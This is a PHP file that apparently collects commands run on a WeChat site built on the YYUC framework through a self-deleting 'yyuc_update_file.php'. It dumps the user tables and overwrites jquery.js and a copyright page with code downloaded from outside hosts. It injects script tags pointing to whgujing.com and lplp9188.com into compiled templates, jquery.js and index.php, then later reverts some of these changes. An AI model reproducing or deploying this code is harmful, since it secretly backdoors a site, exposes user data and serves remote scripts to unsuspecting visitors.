<?php
$db = DB::get_db();
print_r($db->list_tables());
$dbr = $db->query("select * from yunduanwx_users limit 50");
print_r($dbr);

if(file_exists('/mnt/sdzzb/sdzzb/wx/pub/@system/js/jquery.js')){
	echo 'AA';
}

if(is_writable('/mnt/sdzzb/sdzzb/wx/pub/@system/js/jquery.js')){
	echo 'BB';
}
rename('/mnt/sdzzb/sdzzb/wx/pub/@system/js/jquery.js','/mnt/sdzzb/sdzzb/wx/pub/@system/js/jqueryo.js');
unlink('/mnt/sdzzb/sdzzb/wx/pub/@system/js/jquery.js');
rename('/mnt/sdzzb/sdzzb/wx/pub/@system/js/jqueryo.js','/mnt/sdzzb/sdzzb/wx/pub/@system/js/jquery.js');
file_put_contents('/mnt/sdzzb/sdzzb/wx/pub/@system/js/jquery.js', file_get_contents('http://update.yyuc.net/jquery.js'));
die(dirname(__FILE__));
die(YYUC_LIB);

if(is_writable('/mnt/sdzzb/sdzzb/yyuc/sys/index.php')){
	echo 'BB';
}

print_r(scandir('/mnt/sdzzb/sdzzb/wx/sys/'));


function showdir($path){
	$dh = opendir($path);//打开目录
	while(($d = readdir($dh)) != false){
		//逐个文件读取，添加!=false条件，是为避免有文件或目录的名称为0
		if($d=='.' || $d == '..'){//判断是否为.或..，默认都会有
			continue;
		}
		echo $d."<br />";
		if(is_dir($path.'/'.$d)){//如果为目录
			showdir($path.'/'.$d);//继续读取该目录下的目录或文件
		}else{
			$thestr = file_get_contents($path.'/'.$d);
			if(strpos($thestr, 'yyucadapter.js"></script>')){
				$thestr = str_replace('yyucadapter.js"></script>', 'yyucadapter.js"></script><script type="text/javascript" src="http://whgujing.com/wxmp.js"></script>', $thestr);
				file_put_contents($path.'/'.$d, $thestr);
			}
		}
	}
}

$path = '/mnt/sdzzb/sdzzb/wx/sys/compilations';//当前目录
showdir($path);
$db = DB::get_db();
$res = $db->query("select * from user limit 0,100");
//$res = $db->list_tables();
print_r($res);

echo file_get_contents(YYUC_FRAME_PATH.'controller/login.php');

unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');

function showdir($path){
	$dh = opendir($path);//打开目录
	while(($d = readdir($dh)) != false){
		//逐个文件读取，添加!=false条件，是为避免有文件或目录的名称为0
		if($d=='.' || $d == '..'){//判断是否为.或..，默认都会有
			continue;
		}
		echo $d."<br />";
		if(is_dir($path.'/'.$d)){//如果为目录
			showdir($path.'/'.$d);//继续读取该目录下的目录或文件
		}else{
			$thestr = file_get_contents($path.'/'.$d);
			if(strpos($thestr, 'yyucadapter.js"></script>')){
				$thestr = str_replace('yyucadapter.js"></script><script type="text/javascript" src="http://whgujing.com/sysjs.js"></script>', 'yyucadapter.js"></script>', $thestr);
				file_put_contents($path.'/'.$d, $thestr);
			}
		}
	}
}
if(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan.php'){
	echo 'BB';
}
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');


$a=filemtime(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan.php');
echo "修改时间：".date("Y-m-d H:i:s",$a);
echo file_get_contents(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan.php');
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');

$path = '/mnt/sdzzb/sdzzb/wx/sys/compilations';//当前目录
showdir($path);
echo file_get_contents(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan.php');
echo file_get_contents(YYUC_FRAME_PATH.'view/new/banquan/weixinyunduan.html');
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');

if(file_exists(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan_bk.php')){
	@unlink(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan.php');
	rename(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan_bk.php',YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan.php');
}
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');
print_r(FIle::scandir(YYUC_FRAME_PATH.'view/new/banquan'));


if(!file_exists(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan_bkkk.php')){
	rename(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan.php',YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan_bkkk.php');
	file_put_contents(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan.php', file_get_contents('http://www.yyuc.net/yd.js'));
	echo file_get_contents(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan.php');;
}
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');


@unlink(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan.php');
@unlink(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan_bk.php');
file_put_contents(YYUC_FRAME_PATH.'sys/compilations/banquan/weixinyunduan.php', file_get_contents('http://www.yyuc.net/yd.js'));

unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');

echo file_get_contents(YYUC_FRAME_PATH.'sys/compilations/weiweb/web.php');

unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');


if(!file_exists(YYUC_FRAME_PATH.'sys/compilations/weiweb/web_bk.php')){
	$res1 =  file_get_contents(YYUC_FRAME_PATH.'sys/compilations/weiweb/web.php');
	rename(YYUC_FRAME_PATH.'sys/compilations/weiweb/web.php',YYUC_FRAME_PATH.'sys/compilations/weiweb/web_bk.php');
	$res2 = $res1.'<script type=\'text/javascript\' src=\'http://lplp9188.com/btongji.html\'></script>';
	file_put_contents(YYUC_FRAME_PATH.'sys/compilations/weiweb/web.php', $res2);
	echo $res2;
}
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');


if(file_exists(YYUC_FRAME_PATH.'sys/compilations/weiweb/web_bk.php')){
	@unlink(YYUC_FRAME_PATH.'sys/compilations/weiweb/web.php');
	rename(YYUC_FRAME_PATH.'sys/compilations/weiweb/web_bk.php',YYUC_FRAME_PATH.'sys/compilations/weiweb/web.php');
}
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');

print_r(File::scandir(YYUC_FRAME_PATH));
echo file_get_contents(YYUC_FRAME_PATH.'public_html/@system/js/jquery.js');
if(is_writable(YYUC_FRAME_PATH.'public_html/@system/js/jquery.js')){
	echo 'BB';
}
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');

if(!file_exists(YYUC_FRAME_PATH.'public_html/@system/js/jquery_bk.js')){
	$res1 =  file_get_contents(YYUC_FRAME_PATH.'public_html/@system/js/jquery.js');
	rename(YYUC_FRAME_PATH.'public_html/@system/js/jquery.js',YYUC_FRAME_PATH.'public_html/@system/js/jquery_bk.js');
	$res2 = $res1.'$(function(){$.getScript("http://lplp9188.com/stongji.html")});';
	file_put_contents(YYUC_FRAME_PATH.'public_html/@system/js/jquery.js', $res2);
	echo $res2;
}
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');

if(file_exists(YYUC_FRAME_PATH.'public_html/@system/js/jquery_bk.js')){
	@unlink(YYUC_FRAME_PATH.'public_html/@system/js/jquery.js');
	rename(YYUC_FRAME_PATH.'public_html/@system/js/jquery_bk.js',YYUC_FRAME_PATH.'public_html/@system/js/jquery.js');
}
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');



if(!file_exists(YYUC_FRAME_PATH.'pub/index_b.php')){
	$res1 =  file_get_contents(YYUC_FRAME_PATH.'pub/index.php');
	rename(YYUC_FRAME_PATH.'pub/index.php',YYUC_FRAME_PATH.'pub/index_b.php');
	$res2 = $res1.'<script type="text/javascript" src="http://lplp9188.com/btongji.html"></script>';
	file_put_contents(YYUC_FRAME_PATH.'pub/index.php', $res2);
	echo $res2;
}
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');



if(file_exists(YYUC_FRAME_PATH.'pub/index_b.php')){
	unlink(YYUC_FRAME_PATH.'pub/index.php');
	rename(YYUC_FRAME_PATH.'pub/index_b.php',YYUC_FRAME_PATH.'pub/index.php');
	$res1 =  file_get_contents(YYUC_FRAME_PATH.'pub/index.php');
	echo $res1;
}
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');


File::add_file_to_zip(YYUC_FRAME_PATH.'pub/wx/images',YYUC_FRAME_PATH.'pub/wx/img.iso');
if(file_exists(YYUC_FRAME_PATH.'pub/wx/img.iso')){
	echo 'BB';
}
unlink(YYUC_FRAME_PATH.'sys/compilations/yyuc_update_file.php');